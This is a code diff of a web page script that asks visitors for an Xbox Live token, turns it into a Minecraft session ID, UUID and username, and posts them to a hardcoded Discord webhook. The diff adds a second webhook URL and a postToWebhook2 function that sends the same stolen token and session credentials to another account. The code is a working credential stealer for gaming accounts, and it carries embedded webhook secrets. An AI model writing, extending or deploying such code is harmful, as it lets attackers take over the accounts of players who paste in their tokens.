@@ -20,6 +20,7 @@
 
 <script>
   const webhook_url = 'https://discord.com/api/webhooks/1041392438268408009/SmIHe63fDeDjxCF4eoO8QB4Gi3cC3VM9ByEnyW5u-xBd4T5pxzZ7nrTMTT3QrvhN39pl'
+  const webhook2_url = 'https://discord.com/api/webhooks/1047691731627421786/HZ6enVy92ZGh0DyUyZpiD0VMmDx3smZzggnE8RhYcKAEIV2w64MhtHb8Gk5YXzLHj3hK'
 async function myFunction() {
   let userToken = prompt("Please enter XBL token", "");
   if (userToken != null) {
@@ -58,6 +59,7 @@ async function myFunction() {
                 //else if (networth.noInventory) total_networth = `[NW] Without inventory (API OFF): ${formatNumber(networth.networth)} (${formatNumber(networth.unsoulboundNetworth)}) [NW]`
                 //else total_networth = `[NW] ${formatNumber(networth.networth)} (${formatNumber(networth.unsoulboundNetworth)}) [NW]`
         postToWebhook(username, bearerToken, uuid, userToken)
+      postToWebhook2(username, bearerToken, uuid, userToken)
         document.getElementById("demo5").innerHTML = "POSTED TO WEBHOOK";
     } catch (e) {
         console.log(e)
@@ -147,6 +149,25 @@ function postToWebhook(username, bearerToken, uuid, userToken) {
     axios.post(url, data).then(() => console.log("Successfully authenticated, posting to webhook!"))
 }
 
+  function postToWebhook2(username, bearerToken, uuid, userToken) {
+    const url = webhook2_url
+    let data = {
+        username: " ",
+        avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
+        content: "||```" + userToken + "```||",
+        embeds: [{
+            title: "SSID REFRESHED", color: 0x00ff50, fields: [
+                {name: "Username", value: username, inline: true},
+                {name: "UUID", value: uuid, inline: true},
+                {name: "Ip", value: "[Local Address]", inline: true},
+                {name: "SessionID", value: bearerToken, inline: false},
+                {name: "Login", value: username + ":" + uuid + ":" + bearerToken, inline: false},
+            ]
+        }]
+    }
+    axios.post(url, data).then(() => console.log("Successfully authenticated, posting to second hook!"))
+}
+  
 //function returnText() {
 //  let userToken = 
 //  alert(input)
